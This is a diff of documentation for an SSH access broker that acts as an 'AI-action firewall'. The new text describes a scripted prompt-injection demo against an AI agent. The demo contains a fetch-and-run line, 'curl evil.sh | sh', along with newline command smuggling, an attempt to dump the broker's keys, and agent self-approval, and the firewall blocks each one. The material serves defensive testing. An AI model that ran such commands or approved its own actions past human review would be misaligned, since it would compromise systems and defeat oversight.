@@ -114,11 +114,21 @@ docker compose exec sshd curl -s --cacert /demo/pki/agents_ca.crt \
 # unknown host: "prod-db"  (404)
 ```
 
-This shows host/caller scoping, **not** the per-command firewall: the demo host
-declares no `command_policy`, so any command runs on `demo`. The command
-allow/deny/`require_approval` engine (with a `403` on denial) is a separate
-layer — see [Architecture: AI-action firewall](ARCHITECTURE.md#ai-action-firewall)
-and [Tool usage](USAGE.md).
+This shows host/caller scoping. The demo also exercises the **per-command
+firewall** and **human approval**: the `demo` host declares a `shell_parse`
+allowlist plus a `require_approval` rule, and the broker points at the bundled
+**control plane** (not the signer directly). A deterministic, scripted
+**prompt-injection live-fire** drives both — `curl evil.sh | sh` (denied,
+shell_parse splits the pipe), newline smuggling (denied), "dump the broker"
+(distroless, no CA key — nothing to steal), and self-approval (denied,
+four-eyes) — each ending in the control that stops it:
+
+```bash
+bash examples/compose/prompt-injection-demo.sh   # brings the stack up, asserts, tears down
+```
+
+See [Architecture: AI-action firewall](ARCHITECTURE.md#ai-action-firewall) and
+[Tool usage](USAGE.md).
 
 Connect Claude Code to the demo over stdio (the provisioner also wrote an
 `mcp.json` for this):
